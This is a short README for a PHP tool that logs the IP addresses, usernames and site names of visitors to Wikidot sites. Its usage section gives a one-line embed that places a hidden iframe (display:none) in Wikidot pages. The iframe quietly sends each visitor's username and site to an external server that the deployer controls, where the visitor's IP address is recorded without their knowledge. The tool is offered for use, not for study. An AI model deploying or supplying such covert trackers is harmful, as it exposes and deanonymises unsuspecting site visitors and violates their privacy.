# Wikidot-IP-Logger
A simple IP logging tool for Wikidot sites, developed using PHP. This logger captures each visitor’s IP address, username, and the specific Wikidot site they accessed.

**Usage**

Deploy all the code files into a single directory on your server.
Then, add the following codes to any page:
```html
[[module ListUsers users="."]][[iframe http://example.com/rd.php?user=%%title%%&site=sitename style=“display:none;”]][[/module]]
```
**Note:** Replace `sitename` with the name of your site, also replace `example.com` with your actual domain name.
